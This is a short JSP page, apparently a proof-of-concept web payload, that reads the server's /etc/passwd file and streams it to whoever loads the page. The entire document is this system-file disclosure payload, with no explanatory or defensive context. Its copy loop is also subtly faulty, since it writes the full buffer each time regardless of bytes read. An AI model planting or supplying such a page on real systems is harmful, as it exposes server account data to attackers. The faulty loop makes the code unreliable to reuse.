<%@ page import="java.io.*" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<%
    String filename = "/etc/passwd";

    FileInputStream fileIn = new FileInputStream(filename);
    OutputStream outStream = response.getOutputStream();

    byte[] outputByte = new byte[4096];
    while(fileIn.read(outputByte, 0, 4096) != -1) {
    	outStream.write(outputByte, 0, 4096);
    }
    fileIn.close();
%>
